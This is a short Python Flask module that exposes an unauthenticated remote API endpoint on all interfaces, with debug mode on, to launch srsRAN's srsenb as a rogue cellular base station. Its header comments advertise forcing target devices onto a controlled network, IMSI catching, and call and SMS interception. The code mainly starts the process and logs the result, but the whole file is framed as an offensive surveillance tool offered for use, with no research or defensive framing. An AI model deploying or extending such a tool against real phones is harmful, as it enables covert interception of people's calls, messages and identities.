import os
import subprocess
import logging
from flask import Flask, request, jsonify

app = Flask(__name__)
logging.basicConfig(filename="bts_rogue_logs.txt", level=logging.INFO, format="%(asctime)s - %(message)s")

# -------------------------------------------
# 📡 Rogue BTS Deployment Module
# -------------------------------------------
# ✅ Deploys a Rogue BTS using srsRAN/OpenBTS
# ✅ Forces target devices to connect to a controlled network
# ✅ Supports IMSI Catching & Call/SMS Interception
# ✅ Can be launched remotely via API
# -------------------------------------------

def start_rogue_bts():
    """
    Starts a Rogue BTS using srsRAN or OpenBTS.
    """
    try:
        subprocess.Popen(["srsenb", "--enb.mme_addr=127.0.0.1", "--enb.gtp_bind_addr=127.0.0.1", "--enb.s1c_bind_addr=127.0.0.1"])
        logging.info("Rogue BTS Started Successfully.")
        return "Rogue BTS Started Successfully."
    except Exception as e:
        logging.error(f"Error starting Rogue BTS: {str(e)}")
        return f"Error: {str(e)}"

@app.route('/start_rogue_bts', methods=['POST'])
def rogue_bts():
    """
    API endpoint to start a Rogue BTS instance.
    Example Request:
    curl -X POST http://<server-ip>:5006/start_rogue_bts
    """
    result = start_rogue_bts()
    return jsonify({"status": "success", "message": result})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5006, debug=True)
